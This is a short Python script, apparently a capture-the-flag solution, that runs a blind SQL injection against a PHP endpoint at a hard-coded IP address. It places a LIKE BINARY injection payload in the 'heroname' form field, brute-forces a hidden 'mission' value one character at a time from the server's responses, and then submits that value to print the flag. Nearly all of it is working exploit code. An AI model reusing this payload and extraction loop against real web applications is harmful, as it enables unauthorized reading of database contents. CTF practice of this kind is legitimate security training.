import requests
import string

url = 'http://45.122.249.68:10002/getmission.php'
VAL_MISS = ''

def brute_miss():   
    global VAL_MISS
    for i in range(1,500):
        for char in string.digits + string.ascii_letters + '%':
            # print(char,end='\r')
            data = {'heroname':f"saitama'&&mission like binary '{VAL_MISS+char}%'-- -",'mission':'a'}
            r = requests.post(url,data=data)
            # print(r.text)
            if "Mission failed!!!" not in r.text:
                VAL_MISS += char
                break
        if '%' in VAL_MISS:
            break
    return VAL_MISS[:-1]

def getFlag():
    mission = brute_miss()
    data = {'heroname':f"saitama",'mission':mission}
    r = requests.post(url, data=data)
    print(f"mission: {mission}")
    print(f"Flag: {r.text}")

getFlag()